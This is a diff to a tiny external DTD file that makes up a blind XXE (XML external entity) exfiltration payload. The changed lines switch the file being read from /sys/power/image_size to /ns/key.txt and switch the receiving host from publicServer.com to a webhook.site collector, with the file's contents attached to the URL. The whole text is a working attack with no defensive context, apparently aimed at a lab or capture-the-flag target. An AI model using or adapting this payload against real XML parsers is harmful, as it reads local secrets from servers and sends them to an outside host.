@@ -1,3 +1,3 @@
-<!ENTITY % file SYSTEM "file:///sys/power/image_size">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
+<!ENTITY % file SYSTEM "file:///ns/key.txt">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://webhook.site/46c4ea0b-91ea-4353-8973-02e85e594726?%file;'>">
 %all;
